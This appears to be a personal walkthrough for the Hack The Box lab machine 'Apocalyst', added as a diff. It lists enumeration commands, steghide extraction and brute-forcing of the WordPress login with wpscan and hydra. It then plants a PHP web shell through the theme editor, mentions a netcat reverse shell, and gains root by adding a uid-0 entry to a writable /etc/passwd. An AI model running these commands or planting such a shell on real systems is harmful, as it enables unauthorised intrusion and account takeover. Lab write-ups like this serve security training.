@@ -1,0 +1,51 @@
+1. Changes the /etc/hosts file in order to be able to get pitcures referenced in wordpress blog
+	10.10.10.46 apocalyst.htb
+2. conduct a wp-scan for enumeration
+	wpscan --url http://apocalyst.htb -e vt,tt,u,ap -o wpscan.log
+3. Conduct gobuster scan 
+	gobuster dir --url http://apocalyst.htb -w 
+		/usr/share/dirbuster/wordlists/directory-list-2.3-small.txt
+4. Apparently we are getting a lot of 301s for certain directories, upon using urp we notice that a '/'
+   needs to appended in order to be redirected to get a 200 error, extra options are added are used
+   to account for this in the gobuster scan.
+	gobuster dir --url 
+	http://apocalyst.htb -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt -f -l	
+
+5. Next create a wordlist with cewl, using all words that appear in the page
+	cewl apocalyst.htb -w cewl.txt
+
+6. Cancel previous gobuster and use new wordlist generated from webpage
+	gobuster dir --url http://apocalyst.htb -w cewl.txt -f -l | tee gobuster.txt
+
+7. One page comes back righteousness, save image. Run steghide on it.
+	steghide extract -sf image.jpg	
+8. Another wordlists pops off from steghide image 'lists.txt', after getting wpscan output we find a
+   username falaraki. We will then apply the newly found wordlist and use the username falarki to 
+   try and get further access.
+	wpscan --url http://apocalyst.htb -P list.txt -U falaraki | tee wp.out
+8. Continued ... Alterinatively you could use hydra to brute force login without using wpscan, first
+   find login page 'http://10.10.10.46/wp-login.php' and intercept request with burp and verify no csrf 
+   tokens are utilized otherwise bruteforcing becomes a pain in the butt.
+	hydra -l falaraki -P list.txt apocalyst.htb http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2Fapocalyst.htb%2Fwp-admin%2F&testcookie=1:is incorrect."
+
+9. We have now found the correct password for the account login.
+	[80][http-post-form] host: apocalyst.htb   login: falaraki   password: Transclisiation
+
+10. Next thing to look for is code execution on blog, could create a malicuous plugin or edit an existing
+    php file. Wordpress allows us to do this. Go to -> Appearance -> Editor and now we can edi themes.
+    Add the following php code to the headers.php file
+	echo system($_REQUEST['ipp']);
+    This allows us to execute commands by using the request functionality,
+	view-source:http://10.10.10.46/?ipp=ls
+
+11. From then on we can now create a reverse shell, intercept with burp and change request method with 
+    burp to post request. Use pentestmonkey reverse shell netcat special version.
+
+12. Now we have shell access, noticed that passwd file is read write could then overwrite passowrd for
+    root user. First fix columns and ro problems for vim:
+	stty size
+	stty rows 23 cols 105
+13. We can now create new user with elevated root priveleges.
+	openssl passwd -1 tryme nomore
+14. Copy and paste generated passwd hash and make sure userid and groupid is set to 0 and switch user 
+    to get root shell
